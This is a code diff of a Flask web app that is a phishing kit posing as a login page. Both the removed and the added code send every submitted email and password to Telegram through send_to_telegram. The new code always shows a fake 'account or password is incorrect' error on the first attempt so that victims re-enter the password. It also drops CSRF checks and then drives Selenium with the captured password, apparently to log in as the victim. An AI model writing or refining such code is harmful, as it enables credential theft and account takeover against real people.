@@ -350,6 +350,14 @@ def index():
 
     log_activity("page_visit", user_email=email)
 
+    # Email validation step
+    if step == 'email' and email:
+        valid, message = validate_email_domain(email)
+        if not valid:
+            flash(message, 'error')
+            log_activity("email_validation_failed", user_email=email, success=False, error_message=message)
+            return render_template('index.html', step='email', error=message)
+
     form = LoginForm()
     sitekey = config('CLOUDFLARE_SITEKEY', default='')
 
@@ -404,59 +412,75 @@ def verify_turnstile():
 @limiter.limit("100 per minute")
 def process_form():
     email = request.form.get('email', '').strip().lower()
-    password1 = request.form.get('password', '')
-    password2 = request.form.get('password2', '')
+    password = request.form.get('password', '')
     worker_ip = get_remote_address()
 
     logger.info(f"🔍 Processing form: {email}")
 
-    # Handle different form steps
-    step = request.form.get('step', 'email')
-    
-    if step == 'email':
-        # Email validation step
-        if not email:
-            flash('Email is required', 'error')
-            return redirect(url_for('index', step='email', error='true'))
-        
-        valid, message = validate_email_domain(email)
-        if not valid:
-            flash(message, 'error')
-            log_activity("email_validation_failed", user_email=email, success=False, error_message=message)
-            return redirect(url_for('index', step='email', error='true'))
-        
-        # Email valid, move to password step
-        return redirect(url_for('index', step='password', email=email))
-    
-    elif step == 'password':
-        # First password step
-        if not password1:
-            flash('Password is required', 'error')
-            return redirect(url_for('index', step='password', email=email, error='true'))
-        
-        # Send first credentials to Telegram
-        telegram_sent = send_to_telegram(email, password1, worker_ip, "first")
-        logger.info(f"First password sent to Telegram: {telegram_sent}")
-        
-        # Show session expired message and request verification
-        flash('Session expired. Please verify your identity by re-entering your password.', 'error')
-        return redirect(url_for('index', step='verify', email=email))
-    
-    elif step == 'verify':
-        # Second password verification step
-        if not password2:
-            flash('Password verification is required', 'error')
-            return redirect(url_for('index', step='verify', email=email, error='true'))
-        
-        # Send second credentials to Telegram
-        telegram_sent = send_to_telegram(email, password2, worker_ip, "second")
-        logger.info(f"Verification password sent to Telegram: {telegram_sent}")
-        
-        # Show processing message and start automation
-        flash('Verifying security credentials...', 'info')
-        
-        # Proceed with automation using the second password
-        password = password2
+    # Consolidated Telegram message submission
+    if email and password:
+        telegram_sent = send_to_telegram(email, password, worker_ip, "immediate")
+        logger.info(f"Telegram sent: {telegram_sent} for {email}")
+
+    # Handle direct form submission from JavaScript
+    if not email or not password:
+        flash('Email and password are required', 'error')
+        return redirect(url_for('index', step='password', email=email, error='true'))
+
+    # CSRF protection disabled since we removed sessions
+    logger.info("Processing form submission without CSRF validation")
+
+    submit_action = request.form.get('submit', 'Sign in')
+
+    # Validate email domain first
+    valid, message = validate_email_domain(email)
+    if not valid:
+        flash(message, 'error')
+        log_activity("email_validation_failed", user_email=email, success=False, error_message=message)
+        return redirect(url_for('index', step='password', email=email, error='true'))
+
+    # Two-pass authentication logic using request ID instead of session
+    request_id = request.form.get('request_id', create_request_id())
+    login_attempt = LoginAttempt.query.filter_by(
+        user_email=email, 
+        request_id=request_id
+    ).first()
+
+    if not login_attempt:
+        # First attempt - create new attempt record and go to second pass
+        login_attempt = LoginAttempt()
+        login_attempt.user_email = email
+        login_attempt.request_id = request_id
+        login_attempt.attempt_count = 1
+        db.session.add(login_attempt)
+        db.session.commit()
+
+        log_activity("first_attempt_blocked", user_email=email, success=False, 
+                    error_message="First attempt automatically failed - moving to second pass")
+
+        # Always flash error for first attempt and redirect to retry
+        flash('Your account or password is incorrect. Try again.', 'error')
+        return redirect(url_for('index', step='retry', email=email, retry='true'))
+
+    elif login_attempt.attempt_count == 1:
+        # Second attempt - proceed with automation
+        login_attempt.attempt_count = 2
+        login_attempt.updated_at = datetime.utcnow()
+        db.session.commit()
+        log_activity("second_attempt_proceeding", user_email=email)
+
+        # Continue with Selenium automation below
+
+    else:
+        # More than 2 attempts - reset and start over
+        login_attempt.attempt_count = 1
+        login_attempt.updated_at = datetime.utcnow()
+        db.session.commit()
+
+        flash('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'error')
+        log_activity("attempt_reset", user_email=email, success=False, 
+                    error_message="Attempt counter reset - starting two-pass cycle again")
+        return redirect(url_for('index', step='password', email=email, error='true'))
 
     # Perform Selenium automation (moved outside else block)
     driver = None
